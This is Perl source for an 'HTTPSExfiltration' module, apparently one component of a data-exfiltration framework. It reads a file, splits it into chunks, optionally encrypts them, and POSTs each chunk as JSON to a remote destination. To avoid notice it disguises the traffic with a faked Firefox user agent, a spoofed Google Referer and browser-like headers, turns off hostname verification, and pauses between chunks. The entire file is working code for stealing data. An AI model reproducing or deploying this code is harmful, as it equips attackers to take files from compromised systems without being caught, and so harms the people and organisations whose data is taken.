#!/usr/bin/perl

package HTTPSExfiltration;

require Entity::ExfiltrationEngine;

use Moose;
extends 'ExfiltrationEngine';

use LWP::UserAgent;
use JSON::MaybeXS;
use Term::ProgressBar;

use constant START_TRANSFER => 1;
use constant IN_TRANSFER    => 0;
use constant END_TRANSFER   => -1;
use constant LIMIT_TRANFER  => 4000;

sub setHeader {
    my($req) = @_;

    $req->header('x-auth-token' => 'kfksj48sdfj4jd9d');
    $req->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $req->header('Accept-Language' => 'en-US,en;q=0.5');
    $req->header('Accept-Encoding' => 'gzip, deflate, br');
    $req->header('Referer' => 'https://google.com/');
    $req->header('DNT' => '1');
    $req->header('Cache-Control' => 'max-age=0');
    $req->header('If-SSL-Cert-Subject' => '/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd');
}

sub sendData {
    my($self, $request, $userAgent, $file, $data, $id, $state) = @_;
    my $res = 0;

    my $hash = {
        id      =>  $id,
        file    =>  $file,
        data    =>  $data,
        state   =>  $state
    };

    $request->content($self->encryptionKey ? $self->SUPER::encrypt(encode_json $hash) : encode_json($hash));

    while (!$res || $res->code != 200) {
        $res = $userAgent->request($request);
    }
}

sub exfiltrate {
    my($self, $file) = @_;
    my($data, $n, $count, $size);
    my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    my $request = HTTP::Request->new('POST' => $self->dest);
    my $id = int(rand(100000)) + int(rand(100));

    my $fileSize = $self->SUPER::loadFile($file);
    my $progress = Term::ProgressBar->new ({count => $fileSize, name => "Sending $file", ETA=>'linear'});

    $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');

    setHeader($request);

    sendData($self, $request, $userAgent, $file, '', $id, START_TRANSFER);

    $count = 0;
    $size = $self->size <= LIMIT_TRANFER ? $self->size : LIMIT_TRANFER;
    while (($n = read $self->file, $data, $size) != 0) {
        $count += $n;
        sendData($self, $request, $userAgent, $file, $data, $id, IN_TRANSFER);
        $progress->update($count);

        sleep($self->delay);
    }

    sendData($self, $request, $userAgent, $file, '', $id, END_TRANSFER);

    print "\n";

    $self->SUPER::closeFile();
}

1;
